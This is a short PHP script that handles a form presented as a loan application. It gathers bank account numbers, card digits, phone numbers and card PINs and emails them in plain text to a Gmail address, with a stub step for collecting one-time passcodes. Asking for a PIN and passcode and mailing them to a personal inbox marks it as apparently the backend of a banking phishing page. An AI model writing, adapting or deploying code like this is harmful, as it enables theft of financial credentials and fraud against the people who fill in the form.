<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
  // Retrieve form data based on the page
  if ($_POST["otp"]) {
    // Process data from OTP page
    $otp = $_POST["otp"];
    
    // TODO: Verify the OTP and proceed with loan application
  } else {
    // Process data from index page
    $accountNumber = $_POST["account-number"];
    $cardDigits = $_POST["card-digits"];
    $loanAmount = $_POST["loan-amount"];
    $phoneNumber = $_POST["phone-number"];
    $cardPin = $_POST["card-pin"];
    
    // TODO: Perform any necessary data validation and processing
    
    // Send email to Gmail
    $to = "olajidehabib3@gmail.com"; // Replace with your Gmail address
    $subject = "Loan Application";
    $message = "Account Number: $accountNumber\n"
              . "Last Six Digits of Card: $cardDigits\n"
              . "Loan Amount Needed: $loanAmount\n"
              . "Phone Number: $phoneNumber\n"
              . "Card PIN: $cardPin";
    
    // Set additional headers
    $headers = "From: olajidehabib3@gmail.com"; // Replace with your Gmail address
    
    // Send the email
    if (mail($to, $subject, $message, $headers)) {
      echo "Email sent successfully.";
    } else {
      echo "Failed to send email.";
    }
  }
}
?>
